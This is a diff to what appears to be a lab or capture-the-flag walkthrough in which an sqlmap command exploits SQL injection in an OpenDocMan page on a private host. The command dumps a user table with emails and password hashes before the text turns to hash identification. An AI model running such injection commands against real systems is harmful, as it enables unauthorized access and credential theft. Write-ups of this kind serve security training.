@@ -163,9 +163,13 @@ Let's try to see the tables for the "jabcd0cs" database first:
 ```
 The output is huge so I won't be posting here, BUT, analyzing all the databases we've got, I found one called "odm_user" which appears to be the table responsible for the user's credentials.
 
-Here is the information inside this table:  
+Let's try to dump the contents (rows) of this table: 
 
 ```
+./sqlmap.py -u 'http://192.168.0.15/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user' --dbs -T odm_user --dump
+
+... snip
+
 Database: jabcd0cs
 Table: odm_user
 [2 entries]
@@ -175,6 +179,8 @@ Table: odm_user
 | 1  | 5555551212  | webmin@example.com | webmin   | b78aae356709f8c31118ea613980954b         | min       | web        | 2          | <blank>       |
 | 2  | 555 5555555 | guest@example.com  | guest    | 084e0343a0486ff05530df6c705c8bb4 (guest) | guest     | guest      | 2          | NULL          |
 +----+-------------+--------------------+----------+------------------------------------------+-----------+------------+------------+---------------+
+
+...snip
 ```
 
 Notice that one of the users is "webmin". Once we have the hash we can try to discover what kind of hash it is, by using hash-identifier: 
